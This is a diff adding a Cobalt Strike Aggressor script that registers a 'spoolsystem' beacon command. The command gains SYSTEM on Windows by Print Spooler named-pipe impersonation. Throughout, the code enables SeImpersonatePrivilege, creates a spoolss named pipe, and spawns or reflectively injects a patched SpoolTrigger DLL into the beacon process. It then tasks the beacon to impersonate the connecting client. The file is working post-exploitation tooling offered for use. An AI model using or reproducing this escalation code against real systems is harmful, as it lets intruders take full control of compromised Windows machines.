@@ -1,0 +1,93 @@
+import common.CommonUtils;
+import beacon.CommandBuilder;
+import common.ReflectiveDLL;
+
+sub SpoolTrigger {
+    local('$bid $pipename $spawn $offset $padding $patched $dllbytes $file $builder $pid $pipenameW');
+    $bid = $1;
+    $pipename = $2;
+    $method = $3;
+
+    if ($method eq "spawn") {
+        # this is to avoid cross-arch injection where possible
+        if(binfo($bid, 'barch') eq 'x64') {
+            bdllspawn($1, script_resource("/script/SpoolTrigger.x64.dll"), $pipename, "spooltrigger", 5000, true);
+        }
+        else {
+            bdllspawn($1, script_resource("/script/SpoolTrigger.x86.dll"), $pipename, "spooltrigger", 5000, true);
+        }
+    }
+    else {
+        # patch and self-inject..
+        # first we need to patch up our arguments
+        # we use internal APIs since bdllinject wants a filepath not bytes
+        if(binfo($bid, 'barch') eq 'x64') {
+            $file = script_resource("/script/SpoolTrigger.x64.dll");
+        }
+        else {
+            $file = script_resource("/script/SpoolTrigger.x86.dll");
+        }
+
+        $dllbytes = [CommonUtils readFile: $file];
+        $padding = [CommonUtils garbage: "PATCHME"];
+        $patched = [CommonUtils patch: $dllbytes, "PATCHME", $padding . $pipename];
+        $offset = [ReflectiveDLL findReflectiveLoader: $dllbytes];
+
+        if($offset <= 0) {
+            berror($1, "Could not find ReflectiveLoader");
+            return;
+        }
+       
+        $pid = binfo($bid, 'pid');
+        blog($bid, "Injecting spooltrigger into PID: " . $pid);
+        $builder = [new CommandBuilder];
+        if ([ReflectiveDLL is64: $dllbytes]) {
+            [$builder setCommand: 43];
+        } else {      
+            [$builder setCommand: 9];
+        }
+        [$builder addInteger: parseNumber($pid)];
+        [$builder addInteger: $offset];
+        [$builder addString: [CommonUtils bString: $patched]];
+        call("beacons.task", $null, $bid, cast([$builder build], 'b'));
+    }
+}
+
+sub SpoolSystem {
+    local('$mypipe $pipename $builder')
+    # needed for ImpersonateNamedPipeClient
+    btask($1, "Tasked beacon to get SYSTEM via spoolss",  "T1134");
+    bgetprivs($1, "SeImpersonatePrivilege");
+
+    # fire up a named pipe
+    $mypipe = [CommonUtils garbage: "spooltrigger"];
+    $pipename = "\\\\.\\pipe\\" . $mypipe . "\\pipe\\spoolss";
+    $builder = [new CommandBuilder];
+    [$builder setCommand: 60];
+    [$builder addString: $pipename];
+    call("beacons.task", $null, $1, cast([$builder build], 'b'));
+
+    # trigger spoolss
+    SpoolTrigger($1, $mypipe, $2);
+
+    # impersonate the named pipe client
+    [$builder setCommand: 61];
+    call("beacons.task", $null, $1, cast([$builder build], 'b'));
+}
+
+beacon_command_register("spoolsystem", "Gets SYSTEM via spoolss",
+	"Uses named pipe impersonation to gain SYSTEM via Print Spooler.\n\n" .
+	"Use: spoolsystem <method>\n\n" .
+    "Example: spoolsystem inject\n" .
+    "Example: spoolsystem spawn" );
+
+alias spoolsystem {
+    local('$args');
+    $args = substr($0, strlen("spoolsystem "));
+
+    if ($args eq "") {
+		berror($1, "Please specify an execution method.");
+		return;
+	}
+    SpoolSystem($1, $args);
+}
